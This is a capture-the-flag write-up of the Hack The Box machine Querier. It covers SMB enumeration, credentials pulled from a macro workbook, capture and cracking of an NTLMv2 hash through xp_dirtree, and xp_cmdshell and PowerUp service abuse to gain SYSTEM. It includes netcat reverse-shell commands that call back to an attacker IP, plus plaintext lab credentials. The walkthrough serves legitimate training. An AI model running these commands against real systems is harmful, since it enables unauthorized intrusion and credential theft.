---
description: https://www.hackthebox.eu/home/machines/profile/175
---

# Querier

![](<../../../.gitbook/assets/image (257) (1).png>)

## Nmap

We start off by quickly scanning all ports using `nmap 10.10.10.125 -p-` once this has finished we can take the found ports (ignoring the RCP ports) and scan them more intensively to get the following results:

```
nmap -p- 10.10.10.125

PORT      STATE SERVICE

135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown

nmap 10.10.10.125 -p 135,139,445,1433,5985,47001  -A -T4

PORT      STATE SERVICE       VERSION

135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: QUERIER
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: QUERIER.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2020-10-11T09:14:54
|_Not valid after:  2050-10-11T09:14:54
|_ssl-date: 2020-10-11T09:40:25+00:00; +23s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 22s, deviation: 0s, median: 22s
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-10-11T09:40:21
|_  start_date: N/A
```

## SMB

We start off by checking the SMB ports using `smbclient`. We are able to connect using the `-N` switch to specify no password. We can view the remote shares with `smbclient -L 10.10.10.125 -N`.

After finding the reports share we can attempt to connect directly to it with the following command `smbclient \\\\10.10.10.125\\Reports -N`

From here we can grab the .xlsm file in the share using the `get` command.

![](<../../../.gitbook/assets/image (234).png>)

XLSM is a macro enabled XLSX workbook that use XML and ZIP to store information. We can use `binwalk` with the `-e` switch to extract the file to a folder.

![Using binwalk](<../../../.gitbook/assets/image (235) (1).png>)

We can run the `strings` command on the vbaProject.bin file to obtain the following information where Uid and Pwd appear to be credentials.

![Using strings on the .bin file](<../../../.gitbook/assets/image (236) (1).png>)

We can also view the macro in LibreOffice Calc to obtain the same information.

![LibreOffice Calc](<../../../.gitbook/assets/image (237).png>)

We have obtained the following credentials:

* Username = `reporting`
* Password = `PcwTWTHRwryjc$c6`

We can then use Impacket's mssqlclient.py to connect to the SQL server on port 1433 with the credentials we have found. Before we do so we need to edit our hosts file so we can authenticate to MSSQL.

Add the box domain name to the hosts file in /etc/hosts

![](<../../../.gitbook/assets/image (238).png>)

After this has been completed we can then navigate to the directory where mssqlclient.py is installed and run the python script using the following syntax:

```
python mssqlclient.py  querier/reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth
```

the $ symbol in the password is not interpreted properly and we will need to encapsulate the password in single quotation marks to send it "as is" for the password to authenticate correctly.

![](<../../../.gitbook/assets/image (239) (1).png>)

From here the first thing to try would be the command `xp_cmdshell` to see if we can grab shell. In this instance access was denied so we need to log on elsewhere to proceed. What we can do is to try and capture an NTLM hash by getting the remote machine user account to authenticate against a SMB server on our attacking machine.

When the victim machine sends its request we can capture the NTLM hash and attempt to crack it offline with `Hashcat` or John the Ripper.

To start this process we need to start a SMB server on our attacking machine. Impacket has a script for this called smbserver.py

```
python3 smbserver.py -smb2support <sharename> <sharepath>
```

![running smbserver.py](<../../../.gitbook/assets/image (241) (1).png>)

From here we can run the `EXEC xp_dirtree` command on the victim machine to attempt to connect back to our attacking machine and we can capture the NTLMv2 hash.

![](<../../../.gitbook/assets/image (242) (1).png>)

The above command was taken from this Medium article which I highly recommend reading regarding this.

{% embed url="https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478" %}

We can see on Kali we have caught the NTLMv2 hash.

![Captured NTLM hash](<../../../.gitbook/assets/image (243).png>)

We can save the NTLMv2 hash to file and attempt to crack with John The Ripper. If you are having issues with the NTLMv2 hash not loading in John or `Hashcat` you may be using the latest version of Impacket which was causing me this issue. I reached out for help on TCM's Discord channel and was advised to use Impacket 0.9.19 (I was using 0.9.21).

I was able to easily uninstall Impacket and reinstall with 0.9.21 using Dewalt's pimpmykali python script found here:

{% embed url="https://github.com/Dewalt-arch/pimpmykali" %}

After this I was able to grab the NTLMv2 hash again and was able to successfully load it into John.

From here we can run this hash against John with the rockyou.txt word list.

![Running John against the hash](<../../../.gitbook/assets/image (244).png>)

We now have the password "corporate568". We can log into the MSSQL server again as we did above, however this time we can log in with the mssql-svc account which we obtained from the NTLMv2 hash.

```
mssqlclient.py  querier/mssql-svc:'corporate568'@10.10.10.125 -windows-auth 
```

![logging in with the mssql-svc account.](<../../../.gitbook/assets/image (245).png>)

Running the help command we get the following output:

![](<../../../.gitbook/assets/image (246) (1).png>)

What we want is the `xp_cmdshell`. We first need to enable it with the `enable_xp_cmdshell` command to make it usable.

![command example](<../../../.gitbook/assets/image (247).png>)

After this we can effectively execute `cmd` commands. We would ideally take advantage of this so we can try to gain a reverse shell to make our usage much easier. I initially tried hosting netcat on the attacking machine with python and could not get a call back using `Powershell Invoke-Webrequest` or `certutil.exe`.

Instead I decided on using the smbserver.py script we used earlier. Doing this I can host the `nc.exe` file in the SMB share and execute it from the MSSQL server.

Move `nc.exe` to a preferred directory. For ease of use I moved `nc.exe` into the same directory in which I have smbclient.py located. Once completed run the following command to start up the SMB server again.

```
sudo python smbserver.py -smb2support <sharename> ./
```

Once completed start a `netcat` listener on the attacking machine using `nc -lvp 4444`.

![netcat on port 4444](<../../../.gitbook/assets/image (248) (1).png>)

We can now execute the following command on the MSSQL server:

```
xp_cmdshell \\<IP>\shared\nc.exe -e cmd.exe <IP> 4444
```

We now have a reverse shell.

![](<../../../.gitbook/assets/image (249) (1).png>)

We can now grab the `user.txt` flag before moving onto Privilege escalation.

![](<../../../.gitbook/assets/image (250) (1).png>)

## Privilege Escalation

I started off by doing basic enumeration and found with `whoami /priv` that we have the `SeImpersonate` privilege however, as we are on a Windows 2019 Server machine I was unable to execute the exploit. With anything older than Server 2019 this is usually an easy win.

I uploaded powerup.ps1 to the SMB server and then copied this down into the Reporting directory at `C:\Reporting` since we have write and execute permissions in this folder.

![Copying powerup.ps1 from the SMB server.](<../../../.gitbook/assets/image (251) (1).png>)

Powerup also picks up the SeImpersonate token when running the Invoke-AllChecks module. What we are interested in is the service 'UsoSvc' By default running the recommended AbuseFunction as listed below will add a new local administrator account for us.

![](<../../../.gitbook/assets/image (254) (1).png>)

Instead of this we will use the AbuseFunction to create a `netcat` reverse shell instead. We can use the following command:

```
Invoke-ServiceAbuse -Name 'UsoSvc' -command "\10.10.14.19\shared\nc.exe -e cmd.exe 10.10.14.19 6666"
```

Once again calling the `nc.exe` in our SMB server we hosted earlier. Just make sure you start a `netcat` listener on the attacking machine first. If done correctly this should call back a as `NT Authority\System`

![](<../../../.gitbook/assets/image (255).png>)

From here we can grab the `root.txt` flag.

![](<../../../.gitbook/assets/image (256) (1).png>)
